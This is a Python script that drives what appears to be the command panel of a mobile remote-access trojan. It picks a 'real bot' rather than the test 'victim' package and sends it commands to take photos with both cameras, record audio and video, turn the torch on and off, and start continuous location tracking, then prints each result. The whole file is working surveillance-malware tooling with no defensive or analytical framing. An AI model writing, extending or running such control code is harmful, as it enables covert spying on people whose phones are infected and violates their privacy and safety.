#!/usr/bin/env python3
"""Drives the new payload features against the live bot through the panel."""
import json
import socket
import sys

CONTROL = ("127.0.0.1", 8778)


def call(req, timeout=90):
    s = socket.create_connection(CONTROL, timeout=timeout)
    s.settimeout(None)
    s.sendall(json.dumps(req).encode() + b"\n")
    buf = b""
    while b"\n" not in buf:
        c = s.recv(65536)
        if not c:
            break
        buf += c
    s.close()
    return json.loads(buf.split(b"\n")[0].decode())


def main():
    bots = call({"op": "list"}, timeout=15).get("bots", [])
    real = [b for b in bots if b["info"].get("package") != "com.example.victim"]
    if not real:
        print("no real bot:", [(b["id"], b["info"].get("package")) for b in bots])
        return 1
    bid = real[0]["id"]
    print("BOT:", bid)

    tests = [
        ("cameras", {}),
        ("caches", {}),
        ("storage", {}),
        ("settings", {}),
        ("location", {}),
        ("photo", {"facing": "back"}),
        ("photo", {"facing": "front"}),
        ("torch", {"facing": "back", "on": True}),
        ("torch", {"facing": "back", "on": False}),
        ("mic", {"seconds": 3}),
        ("locate_start", {"interval_ms": 2000}),
        ("locate_stop", {}),
        ("video", {"facing": "back", "seconds": 3}),
    ]

    for cmd, args in tests:
        r = call({"op": "cmd", "bot": bid, "cmd": cmd, "args": args, "timeout": 60}, timeout=80)
        if r.get("ok"):
            res = r.get("result", {})
            out = json.dumps(res, ensure_ascii=False)
            print(f"\n--- {cmd} {args} ---")
            print(out[:600])
        else:
            print(f"\n--- {cmd} {args} --- SERVER ERROR: {r.get('error')}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
